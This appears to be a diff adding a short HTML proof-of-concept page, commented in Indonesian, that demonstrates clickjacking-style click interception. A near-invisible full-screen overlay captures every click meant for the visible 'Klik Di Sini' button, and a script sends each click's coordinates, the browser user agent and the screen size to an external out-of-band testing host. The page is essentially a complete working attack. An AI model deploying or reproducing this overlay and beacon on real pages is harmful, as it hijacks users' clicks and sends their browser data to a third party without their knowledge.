@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Overlay Click Logger PoC</title>
+  <style>
+    body { font-family: sans-serif; margin: 0; padding: 0; }
+    h2 { margin-top: 50px; text-align: center; }
+    #log { padding: 10px; color: green; text-align: center; }
+    .click-area {
+      width: 300px;
+      height: 100px;
+      background-color: #4caf50;
+      margin: 100px auto;
+      text-align: center;
+      line-height: 100px;
+      color: white;
+      font-size: 20px;
+      border-radius: 10px;
+      position: relative;
+      z-index: 1;
+    }
+    .overlay {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      z-index: 999;
+      background: rgba(255, 255, 255, 0.01); /* transparan namun klikable */
+    }
+  </style>
+</head>
+<body>
+
+  <h2>Overlay Click Logging Test</h2>
+  <div id="log">Klik area di bawah ini</div>
+
+  <div class="click-area" id="target">
+    Klik Di Sini 🎯
+  </div>
+
+  <script>
+    const overlay = document.createElement('div');
+    overlay.className = 'overlay';
+
+    overlay.addEventListener('click', (e) => {
+      document.getElementById('log').innerText = '🔍 [Overlay] Klik terdeteksi pada posisi: ' + e.clientX + ',' + e.clientY;
+
+      // Simpan log ke server/webhook jika perlu
+      fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/click-logged', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          x: e.clientX,
+          y: e.clientY,
+          userAgent: navigator.userAgent,
+          screen: `${screen.width}x${screen.height}`
+        })
+      });
+    });
+
+    // Tambahkan overlay ke dokumen
+    document.body.appendChild(overlay);
+  </script>
+</body>
+</html>
